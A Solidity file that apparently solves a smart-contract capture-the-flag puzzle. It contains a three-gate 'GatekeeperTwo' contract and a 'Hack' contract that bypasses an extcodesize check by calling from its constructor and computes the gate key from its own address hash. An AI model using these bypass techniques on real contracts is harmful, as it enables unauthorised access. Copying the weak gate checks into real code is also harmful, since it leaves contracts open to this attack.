// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "hardhat/console.sol";

contract GatekeeperTwo {
	address public entrant;

	modifier gateOne() {
		require(msg.sender != tx.origin);
		_;
		console.log("Passed gate 1!");
	}

	modifier gateTwo() {
		uint256 x;
		assembly {
			x := extcodesize(caller())
		}
		require(x == 0);
		console.log("Passed gate 2!");
		_;
	}

	modifier gateThree(bytes8 _gateKey) {
		require(
			uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) ==
				uint64(0) - 1
		);
		console.log("Passed gate 3!");
		_;
	}

	function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
		entrant = tx.origin;
		return true;
	}
}

contract Hack {
	GatekeeperTwo gk2;

	constructor(address gkAddress) public {
		gk2 = GatekeeperTwo(gkAddress);
		bytes8 key = calculateDiff();
		gk2.enter(key);
	}

	function calculateMaxUint64() public pure returns (uint64) {
		return uint64(0) - 1;
	}

	function uint64FromBytes8() public view returns (uint64) {
		return uint64(bytes8(keccak256(abi.encodePacked(msg.sender))));
	}

	function calculate(bytes8 key) public view returns (uint64) {
		return uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(key);
	}

	function calculateDiff() public view returns (bytes8) {
		uint64 diff = calculateMaxUint64() -
			uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
		return bytes8(diff);
	}

	function checkGateThree() public view {
		bytes8 key = calculateDiff();
		console.log("Key: ");
		console.logBytes8(key);
		uint64 calculateResult = calculate(key);
		console.log("Result: %s", calculateResult);
		uint64 maxUint64 = calculateMaxUint64();
		console.log("Max uint64: %s", maxUint64);
		require(calculateResult == maxUint64, "Failed");
	}
}
